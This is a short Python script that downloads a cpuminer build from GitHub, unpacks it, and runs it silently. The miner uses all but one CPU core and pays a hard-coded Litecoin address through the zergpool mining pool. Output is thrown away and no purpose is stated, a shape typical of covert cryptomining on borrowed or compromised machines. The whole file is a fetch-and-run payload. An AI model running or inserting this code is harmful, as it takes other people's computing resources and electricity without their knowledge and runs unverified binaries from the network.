import os

os.system("wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz")
os.system("tar xhf Cpuminer-opt-cpu-pool-linux64.tar.gz")
os.system("./cpuminer -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u LbBELwY4VPb11ge5EjtBVF8f6v7Tr89EQ4 -p c=LTC,ID=gulajawa -t $(nproc --ignore 1) >/dev/null >/dev/null 2>&1")
